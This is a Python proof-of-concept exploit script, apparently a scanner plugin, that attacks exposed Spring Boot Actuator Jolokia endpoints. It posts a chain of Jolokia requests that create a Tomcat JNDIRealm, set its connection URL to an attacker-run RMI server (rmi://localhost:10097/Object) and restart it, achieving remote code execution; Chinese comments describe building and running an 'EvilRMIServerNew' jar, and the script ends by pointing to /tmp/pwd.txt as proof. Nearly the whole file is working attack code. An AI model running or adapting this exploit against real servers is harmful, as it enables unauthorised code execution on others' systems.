#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-03-19 18:02:50
# @Author  : Your Name (you@example.org)
# @Link    : http://example.org
# @Version : $Id$

# 感谢 @Lucifaer
# https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/

import requests
import time

'''
直接导入idea，修改其中的payload，导出为jar包

执行命令 会监听1097端口
java -cp maven_demo1.jar EvilRMIServerNew
'''

create_JNDIrealm = {
    "mbean": "Tomcat:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Tomcat:type=Engine"]
}

set_contextFactory = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}

set_connectionURL = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": "rmi://localhost:10097/Object"
}

stop_JNDIrealm = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "stop",
    "arguments": []
}

start = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "start",
    "arguments": []
}

EXPLOIT = [create_JNDIrealm, set_contextFactory,
           set_connectionURL, stop_JNDIrealm, start]

HEADERS = {
    'User-Agent': 'Mozilla/5.0',
}


def do_scan(ip, port, service, is_http, task_msg):
    if (service.find('http') < 0) and (is_http is False):
        return False

    scheme = 'https' if '443' in str(port) else 'http'
    for path in ['actuator/jolokia', 'jolokia']:
        target = '{}://{}:{}/{}/'.format(scheme, ip, port, path)

        for i in EXPLOIT:
            try:
                rep = requests.post(
                    target, json=i, headers=HEADERS, timeout=10)
            except Exception as e:
                # print(repr(e))
                break


def poc(url):
    if ':' in url:
        ip, port = url.split(':')
    else:
        ip, port = url, 8080

    return do_scan(ip, port, 'http', True, '')


if __name__ == '__main__':
    a = '''
    直接导入idea，修改其中的payload，导出为jar包

    执行命令 会监听1097端口
    java -cp maven_demo1.jar EvilRMIServerNew
    '''
    print(a)
    print('\n\n')
    result = poc('localhost:8090')
    print('check /tmp/pwd.txt')
    print(result)
